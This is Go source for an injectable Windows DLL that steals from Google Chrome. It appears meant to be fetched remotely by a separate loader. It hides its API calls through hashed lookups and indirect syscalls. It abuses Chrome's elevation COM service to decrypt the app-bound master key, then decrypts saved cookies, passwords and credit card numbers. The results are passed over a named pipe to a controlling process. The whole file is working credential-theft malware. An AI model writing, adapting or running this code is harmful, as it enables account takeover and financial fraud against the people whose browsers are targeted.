// build with go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o gobound.dll
// host at any remote endpoint that can be downloaded via https so net.go can pull it down
package main

import "C"

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	wincall "github.com/carved4/go-wincall"
	"github.com/carved4/go-wincall/pkg/resolve"
	_ "modernc.org/sqlite"
)

var (
	kernel32Base             uintptr
	ole32Base                uintptr
	oleaut32Base             uintptr
	ntdllBase                uintptr
	createFileW              uintptr
	writeFile                uintptr
	closeHandle              uintptr
	coInitializeEx           uintptr
	coUninitialize           uintptr
	coCreateInstance         uintptr
	coSetProxyBlanket        uintptr
	sysAllocStringByteLen    uintptr
	sysFreeString            uintptr
	sysStringByteLen         uintptr
	freeLibraryAndExitThread uintptr
	getModuleHandleW         uintptr
	hPipe                    uintptr
	hModule                  uintptr
)

var (
	queryProcess    resolve.Syscall
	querySystem     resolve.Syscall
	queryObject     resolve.Syscall
	closeHandleNt   resolve.Syscall
	readFileNt      resolve.Syscall
	queryFileInfo   resolve.Syscall
	setFileInfo     resolve.Syscall
	duplicateObject resolve.Syscall
	openProcess     resolve.Syscall
)

var (
	openHandles      = make([]uintptr, 0, 100)
	openHandlesMutex sync.Mutex
)

func trackHandle(handle uintptr) {
	openHandlesMutex.Lock()
	defer openHandlesMutex.Unlock()
	openHandles = append(openHandles, handle)
}

func closeAllHandles() {
	openHandlesMutex.Lock()
	defer openHandlesMutex.Unlock()
	for _, h := range openHandles {
		if h != 0 {
			wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, h)
		}
	}
	openHandles = openHandles[:0]
}

const (
	GENERIC_READ          = 0x80000000
	GENERIC_WRITE         = 0x40000000
	OPEN_EXISTING         = 3
	FILE_ATTRIBUTE_NORMAL = 0x80
	INVALID_HANDLE_VALUE  = ^uintptr(0)
	CLSCTX_LOCAL_SERVER   = 0x4
	pipeName              = `\\.\pipe\chromepipe`
	fileReadData          = 0x0001
	fileWriteData         = 0x0002
	fileAppendData        = 0x0004
	fileReadEA            = 0x0008
	fileWriteEA           = 0x0010
	fileReadAttr          = 0x0080
	fileWriteAttr         = 0x0100
	readControl           = 0x20000
	synchronize           = 0x100000
	processVmOp           = 0x0008
	processVmRead         = 0x0010
	processVmWrite        = 0x0020
	statusMismatch        = 0xC0000004
	statusSuccess         = 0x00000000
	queryInfo             = 0x0400
	dupHandle             = 0x0040
	handleClass           = 51
	typeClass             = 2
	fileStandardInfo      = 5
	filePositionInfo      = 14
	fileNameInfo          = 9
)

var (
	CLSID_ChromeElevator = GUID{0x708860E0, 0xF641, 0x4611, [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
	IID_IElevator        = GUID{0x463ABECF, 0x410D, 0x407F, [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}
)

func init() {
	kernel32Base = wincall.GetModuleBase(wincall.GetHash("kernel32.dll"))
	ole32Base = wincall.LoadLibraryLdr("ole32.dll")
	oleaut32Base = wincall.LoadLibraryLdr("oleaut32.dll")
	ntdllBase = wincall.GetModuleBase(wincall.GetHash("ntdll.dll"))

	createFileW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateFileW"))
	writeFile = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("WriteFile"))
	closeHandle = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CloseHandle"))

	coInitializeEx = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoInitializeEx"))
	coUninitialize = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoUninitialize"))
	coCreateInstance = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoCreateInstance"))
	coSetProxyBlanket = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoSetProxyBlanket"))

	sysAllocStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysAllocStringByteLen"))
	sysFreeString = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysFreeString"))
	sysStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysStringByteLen"))
	freeLibraryAndExitThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("FreeLibraryAndExitThread"))
	getModuleHandleW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleW"))
	queryProcess = wincall.GetSyscall(wincall.GetHash("NtQueryInformationProcess"))
	querySystem = wincall.GetSyscall(wincall.GetHash("NtQuerySystemInformation"))
	queryObject = wincall.GetSyscall(wincall.GetHash("NtQueryObject"))
	closeHandleNt = wincall.GetSyscall(wincall.GetHash("NtClose"))
	readFileNt = wincall.GetSyscall(wincall.GetHash("NtReadFile"))
	queryFileInfo = wincall.GetSyscall(wincall.GetHash("NtQueryInformationFile"))
	setFileInfo = wincall.GetSyscall(wincall.GetHash("NtSetInformationFile"))
	duplicateObject = wincall.GetSyscall(wincall.GetHash("NtDuplicateObject"))
	openProcess = wincall.GetSyscall(wincall.GetHash("NtOpenProcess"))
	dllName, _ := wincall.UTF16ptr("payload.dll")
	hModule, _, _ = wincall.CallG0(getModuleHandleW, uintptr(unsafe.Pointer(dllName)))

	go run()
}

func writePipe(msg string) {
	if hPipe == 0 || hPipe == INVALID_HANDLE_VALUE {
		return
	}
	data := []byte(msg + "\x00")
	var written uint32
	wincall.CallG0(writeFile,
		hPipe,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		uintptr(0),
	)
}

func connectPipe() bool {
	pipeNamePtr, _ := wincall.UTF16ptr(pipeName)
	hPipe, _, _ = wincall.CallG0(createFileW,
		uintptr(unsafe.Pointer(pipeNamePtr)),
		uintptr(GENERIC_READ|GENERIC_WRITE),
		uintptr(0),
		uintptr(0),
		uintptr(OPEN_EXISTING),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		uintptr(0),
	)
	if hPipe != INVALID_HANDLE_VALUE && hPipe != 0 {
		writePipe("[+] pipe created and listening: " + pipeName)
		return true
	}
	return false
}

func initCOM() bool {
	hr, _, _ := wincall.CallG0(coInitializeEx, uintptr(0), uintptr(0x2))
	return hr == 0 || hr == 1
}

func uninitCOM() {
	wincall.CallG0(coUninitialize)
}

func decryptKey(encryptedKey []byte) ([]byte, error) {
	bstrEnc, _, _ := wincall.CallG0(sysAllocStringByteLen,
		uintptr(unsafe.Pointer(&encryptedKey[0])),
		uintptr(len(encryptedKey)),
	)
	if bstrEnc == 0 {
		return nil, fmt.Errorf("SysAllocStringByteLen failed")
	}
	defer wincall.CallG0(sysFreeString, bstrEnc)

	var pElevator uintptr
	hr, _, _ := wincall.CallG0(coCreateInstance,
		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
		uintptr(0),
		uintptr(CLSCTX_LOCAL_SERVER),
		uintptr(unsafe.Pointer(&IID_IElevator)),
		uintptr(unsafe.Pointer(&pElevator)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("CoCreateInstance failed: 0x%x", hr)
	}

	hr, _, _ = wincall.CallG0(coSetProxyBlanket,
		pElevator,
		uintptr(0xFFFFFFFF),
		uintptr(0xFFFFFFFF),
		uintptr(0),
		uintptr(6),
		uintptr(3),
		uintptr(0),
		uintptr(0x40),
	)

	vtable := *(*uintptr)(unsafe.Pointer(pElevator))

	decryptDataFn := *(*uintptr)(unsafe.Pointer(vtable + 5*unsafe.Sizeof(uintptr(0))))

	var bstrPlain uintptr
	var lastError uint32
	hr, _, _ = wincall.CallG0(decryptDataFn,
		pElevator,
		bstrEnc,
		uintptr(unsafe.Pointer(&bstrPlain)),
		uintptr(unsafe.Pointer(&lastError)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("DecryptData failed: 0x%x, lastError: %d", hr, lastError)
	}
	if bstrPlain == 0 {
		return nil, fmt.Errorf("DecryptData returned null")
	}
	defer wincall.CallG0(sysFreeString, bstrPlain)

	bstrLen, _, _ := wincall.CallG0(sysStringByteLen, bstrPlain)
	if bstrLen == 0 {
		return nil, fmt.Errorf("decrypted key is empty")
	}

	result := make([]byte, bstrLen)
	copy(result, unsafe.Slice((*byte)(unsafe.Pointer(bstrPlain)), bstrLen))

	return result, nil
}

func getLocalStatePath() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	return localAppData + `\Google\Chrome\User Data\Local State`
}

func readEncryptedKey() ([]byte, error) {
	data, err := os.ReadFile(getLocalStatePath())
	if err != nil {
		return nil, fmt.Errorf("read Local State: %v", err)
	}

	content := string(data)
	tag := `"app_bound_encrypted_key":"`
	idx := strings.Index(content, tag)
	if idx == -1 {
		return nil, fmt.Errorf("app_bound_encrypted_key not found")
	}

	start := idx + len(tag)
	end := strings.Index(content[start:], `"`)
	if end == -1 {
		return nil, fmt.Errorf("malformed JSON")
	}

	b64Key := content[start : start+end]
	decoded, err := base64.StdEncoding.DecodeString(b64Key)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %v", err)
	}

	if len(decoded) < 4 {
		return nil, fmt.Errorf("key too short")
	}
	return decoded[4:], nil
}

func run() {
	if !connectPipe() {
		return
	}
	defer wincall.CallG0(closeHandle, hPipe)

	if !initCOM() {
		writePipe("DEBUG:com init failed")
		return
	}
	defer uninitCOM()

	encKey, err := readEncryptedKey()
	if err != nil {
		writePipe(fmt.Sprintf("DEBUG:read encrypted key failed: %v", err))
		writePipe("DONE")
		return
	}

	masterKey, err := decryptKey(encKey)
	if err != nil {
		writePipe(fmt.Sprintf("DEBUG:decrypt key failed: %v", err))
		writePipe("DONE")
		return
	}

	keyHex := fmt.Sprintf("%X", masterKey)
	writePipe(fmt.Sprintf("KEY:%s", keyHex))

	tempFiles := make(map[string]string)
	buf := make([]byte, 4096)

	writePipe("DEBUG:waiting for temp file paths...")

	for {
		var bytesRead uint32
		ret, _, _ := wincall.CallG0(
			wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("ReadFile")),
			hPipe,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&bytesRead)),
			uintptr(0),
		)

		if ret == 0 || bytesRead == 0 {
			break
		}

		msgLen := bytesRead
		if msgLen > 0 && buf[msgLen-1] == 0 {
			msgLen--
		}
		msg := string(buf[:msgLen])

		// Parse potentially multiple messages separated by newlines
		lines := strings.Split(msg, "\n")
		gotReady := false
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}

			if strings.HasPrefix(line, "TEMPFILE:") {
				data := strings.TrimPrefix(line, "TEMPFILE:")
				parts := strings.SplitN(data, "|", 2)
				if len(parts) == 2 {
					dbType := parts[0]
					tmpPath := parts[1]
					tempFiles[dbType] = tmpPath
					writePipe(fmt.Sprintf("DEBUG:received temp file: %s -> %s", dbType, tmpPath))
				}
			} else if strings.HasPrefix(line, "READY") {
				writePipe("DEBUG:received READY signal")
				gotReady = true
				break
			}
		}

		if gotReady {
			break
		}
	}

	if len(tempFiles) == 0 {
		writePipe("DEBUG:no temp files received")
		writePipe("DONE")
		return
	}

	writePipe(fmt.Sprintf("DEBUG:received %d temp files, processing...", len(tempFiles)))

	totalCookies := 0
	totalPasswords := 0
	totalCards := 0
	if cookiesPath, ok := tempFiles["Cookies"]; ok {
		cookies, err := extractCookiesFromDBFile(masterKey, cookiesPath, "Default")
		if err == nil {
			for _, c := range cookies {
				writePipe(fmt.Sprintf("COOKIE:[Default]%s", c))
			}
			totalCookies += len(cookies)
		} else {
			writePipe(fmt.Sprintf("DEBUG:extract cookies error: %v", err))
		}
		os.Remove(cookiesPath)
	}

	if loginPath, ok := tempFiles["Login Data"]; ok {
		passwords, err := extractPasswordsFromDBFile(masterKey, loginPath, "Default")
		if err == nil {
			for _, p := range passwords {
				writePipe(fmt.Sprintf("PASSWORD:[Default]%s", p))
			}
			totalPasswords += len(passwords)
		} else {
			writePipe(fmt.Sprintf("DEBUG:extract passwords error: %v", err))
		}
		os.Remove(loginPath)
	}

	if webDataPath, ok := tempFiles["Web Data"]; ok {
		cards, err := extractPaymentsFromDBFile(masterKey, webDataPath, "Default")
		if err == nil {
			for _, card := range cards {
				writePipe(fmt.Sprintf("CARD:[Default]%s", card))
			}
			totalCards += len(cards)
		} else {
			writePipe(fmt.Sprintf("DEBUG:extract cards error: %v", err))
		}
		os.Remove(webDataPath)
	}

	writePipe(fmt.Sprintf("DEBUG:total: %d cookies, %d passwords, %d cards", totalCookies, totalPasswords, totalCards))

	closeAllHandles()
	writePipe("DONE")

	if hModule != 0 {
		wincall.CallG0(freeLibraryAndExitThread, hModule, 0)
	}
}

func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
	if len(encrypted) < 3+12+16 {
		return nil, fmt.Errorf("encrypted data too short")
	}
	nonce := encrypted[3:15]
	ciphertext := encrypted[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func getChromeUserDataPath() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
}

func ScanProcessHandles(target string) (map[uint32][]Handle, error) {
	procs := make(map[uint32][]Handle)
	var bufLen uint32 = 1024 * 1024
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		mem = make([]byte, bufLen)
		r, _ := wincall.IndirectSyscall(
			querySystem.SSN,
			querySystem.Address,
			5,
			uintptr(unsafe.Pointer(&mem[0])),
			uintptr(bufLen),
			uintptr(unsafe.Pointer(&bufLen)),
		)
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, fmt.Errorf("query system failed: %x", code)
	}

	offset := uint32(0)
	for {
		if offset >= uint32(len(mem)) {
			break
		}

		info := (*SystemProcessInfo)(unsafe.Pointer(&mem[offset]))

		if info.UniqueProcessId != 0 && info.ImageName.Data != nil {
			sz := int(info.ImageName.Size / 2)
			if sz > 0 && sz < 512 {
				buf := (*[512]uint16)(unsafe.Pointer(info.ImageName.Data))[:sz:sz]
				name := syscall.UTF16ToString(buf)

				if strings.EqualFold(name, target) {
					pid := uint32(info.UniqueProcessId)

					var clientId struct {
						pid uintptr
						tid uintptr
					}
					clientId.pid = uintptr(pid)

					var objAttr ObjectAttributes
					objAttr.Length = uint32(unsafe.Sizeof(objAttr))

					var proc uintptr
					if r, _ := wincall.IndirectSyscall(
						openProcess.SSN,
						openProcess.Address,
						uintptr(unsafe.Pointer(&proc)),
						uintptr(queryInfo|dupHandle),
						uintptr(unsafe.Pointer(&objAttr)),
						uintptr(unsafe.Pointer(&clientId)),
					); r == statusSuccess {

						var hBufLen uint32
						var hMem []byte
						hCode := uint32(statusMismatch)

						for hCode == statusMismatch {
							var p uintptr
							if hBufLen > 0 {
								hMem = make([]byte, hBufLen)
								p = uintptr(unsafe.Pointer(&hMem[0]))
							}

							r, _ := wincall.IndirectSyscall(
								queryProcess.SSN,
								queryProcess.Address,
								uintptr(proc),
								handleClass,
								p, uintptr(hBufLen),
								uintptr(unsafe.Pointer(&hBufLen)),
							)
							hCode = uint32(r)
						}

						if hCode == statusSuccess && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
							snap := (*Snapshot)(unsafe.Pointer(&hMem[0]))
							n := snap.Total

							if n > 0 && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
								off := unsafe.Sizeof(Snapshot{})
								items := make([]Handle, n)
								for i := uintptr(0); i < n; i++ {
									src := (*Handle)(unsafe.Pointer(uintptr(unsafe.Pointer(&hMem[0])) + off + i*unsafe.Sizeof(Handle{})))
									items[i] = *src
								}
								procs[pid] = items
							}
						}
						wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))
					}
				}
			}
		}

		if info.NextEntryOffset == 0 {
			break
		}
		offset += info.NextEntryOffset
	}

	return procs, nil
}

func extractFileUnsafe(hnd uintptr, owner uint32) ([]byte, string, error) {
	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(owner)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var proc uintptr
	if r, _ := wincall.IndirectSyscall(
		openProcess.SSN,
		openProcess.Address,
		uintptr(unsafe.Pointer(&proc)),
		uintptr(dupHandle),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	); r != statusSuccess {
		return nil, "", fmt.Errorf("access denied")
	}
	defer wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))

	var dup uintptr
	self := ^uintptr(0)

	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
	if r, _ := wincall.IndirectSyscall(duplicateObject.SSN, duplicateObject.Address, uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
		return nil, "", fmt.Errorf("dup error: %x", r)
	}
	trackHandle(dup)
	defer wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(dup))

	var bufLen uint32
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		var p uintptr
		if bufLen > 0 {
			mem = make([]byte, bufLen)
			p = uintptr(unsafe.Pointer(&mem[0]))
		}
		r, _ := wincall.IndirectSyscall(queryObject.SSN, queryObject.Address, uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, "", fmt.Errorf("query failed: %x", code)
	}

	obj := (*ObjType)(unsafe.Pointer(&mem[0]))
	if obj.Name.Data == nil {
		return nil, "", fmt.Errorf("no name")
	}

	sz := int(obj.Name.Size / 2)
	if sz > 256 {
		sz = 256
	}
	buf := (*[256]uint16)(unsafe.Pointer(obj.Name.Data))[:sz:sz]
	kind := syscall.UTF16ToString(buf)

	if kind != "File" {
		return nil, "", fmt.Errorf("wrong type: %s", kind)
	}

	var nameLen uint32 = 4096
	nameBuf := make([]byte, nameLen)
	var iosb IoStatusBlock

	r, _ := wincall.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
	if r != statusSuccess {
		return nil, "", fmt.Errorf("path error: %x", r)
	}

	nameInfo := (*FileNameInfo)(unsafe.Pointer(&nameBuf[0]))
	nameChars := int(nameInfo.FileNameLength / 2)
	if nameChars > 0 {
		namePtr := unsafe.Pointer(&nameInfo.FileName[0])
		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
		fullpath := syscall.UTF16ToString(nameBuf16)

		if strings.HasPrefix(fullpath, "\\LOCAL\\") || strings.HasPrefix(fullpath, "\\Device\\NamedPipe") || strings.Contains(fullpath, "\\Device\\") {
			return nil, "", fmt.Errorf("skipped pipe")
		}

		var stdInfo FileStandardInfo
		iosb = IoStatusBlock{}

		if r, _ := wincall.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("size error: %x", r)
		}

		fsz := stdInfo.EndOfFile
		if fsz <= 0 {
			return nil, "", fmt.Errorf("empty file")
		}

		var posInfo FilePositionInfo
		posInfo.CurrentByteOffset = 0
		wincall.IndirectSyscall(setFileInfo.SSN, setFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)

		content := make([]byte, fsz)
		iosb = IoStatusBlock{}

		if r, _ := wincall.IndirectSyscall(readFileNt.SSN, readFileNt.Address, uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("read error: %x", r)
		}

		return content[:iosb.Info], fullpath, nil
	}

	return nil, "", fmt.Errorf("no filename")
}

func getHandleFilePathUnsafe(hnd uintptr, owner uint32) (string, error) {
	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(owner)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var proc uintptr
	if r, _ := wincall.IndirectSyscall(
		openProcess.SSN,
		openProcess.Address,
		uintptr(unsafe.Pointer(&proc)),
		uintptr(dupHandle),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	); r != statusSuccess {
		return "", fmt.Errorf("access denied")
	}
	defer wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))

	var dup uintptr
	self := ^uintptr(0)

	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
	if r, _ := wincall.IndirectSyscall(duplicateObject.SSN, duplicateObject.Address, uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
		return "", fmt.Errorf("dup error: %x", r)
	}
	trackHandle(dup)
	defer wincall.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(dup))

	var nameLen uint32 = 4096
	nameBuf := make([]byte, nameLen)
	var iosb IoStatusBlock

	r, _ := wincall.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
	if r != statusSuccess {
		return "", fmt.Errorf("path error: %x", r)
	}

	nameInfo := (*FileNameInfo)(unsafe.Pointer(&nameBuf[0]))
	nameChars := int(nameInfo.FileNameLength / 2)
	if nameChars > 0 {
		namePtr := unsafe.Pointer(&nameInfo.FileName[0])
		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
		fullpath := syscall.UTF16ToString(nameBuf16)
		return fullpath, nil
	}

	return "", fmt.Errorf("no filename")
}

func GetHandleFilePath(hnd uintptr, owner uint32) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancel()

	resultChan := make(chan struct {
		path string
		err  error
	}, 1)

	go func() {
		path, err := getHandleFilePathUnsafe(hnd, owner)
		resultChan <- struct {
			path string
			err  error
		}{path, err}
	}()

	select {
	case result := <-resultChan:
		return result.path, result.err
	case <-ctx.Done():
		return "", fmt.Errorf("timeout")
	}
}

func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	resultChan := make(chan struct {
		data []byte
		path string
		err  error
	}, 1)

	go func() {
		data, path, err := extractFileUnsafe(hnd, owner)
		resultChan <- struct {
			data []byte
			path string
			err  error
		}{data, path, err}
	}()

	select {
	case result := <-resultChan:
		return result.data, result.path, result.err
	case <-ctx.Done():
		return nil, "", fmt.Errorf("timeout")
	}
}

func extractCookiesFromDBFile(masterKey []byte, dbPath string, profile string) ([]string, error) {
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var host, name string
		var encValue []byte
		if err := rows.Scan(&host, &name, &encValue); err != nil {
			continue
		}

		if len(encValue) < 3 {
			continue
		}

		prefix := string(encValue[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encValue)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			value := base64.StdEncoding.EncodeToString(decrypted)
			results = append(results, fmt.Sprintf("%s|%s|%s", host, name, value))
		}
	}

	return results, nil
}

func extractPasswordsFromDBFile(masterKey []byte, dbPath string, profile string) ([]string, error) {
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var url, username string
		var encPassword []byte
		if err := rows.Scan(&url, &username, &encPassword); err != nil {
			continue
		}

		if len(encPassword) < 3 {
			continue
		}

		prefix := string(encPassword[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encPassword)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			results = append(results, fmt.Sprintf("%s|%s|%s", url, username, string(decrypted)))
		}
	}

	return results, nil
}

func extractPaymentsFromDBFile(masterKey []byte, dbPath string, profile string) ([]string, error) {
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var nameOnCard string
		var expMonth, expYear int
		var encCardNumber []byte
		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
			continue
		}

		if len(encCardNumber) < 3 {
			continue
		}

		prefix := string(encCardNumber[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			results = append(results, fmt.Sprintf("%s|%02d/%d|%s", nameOnCard, expMonth, expYear, string(decrypted)))
		}
	}

	return results, nil
}

func main() {}
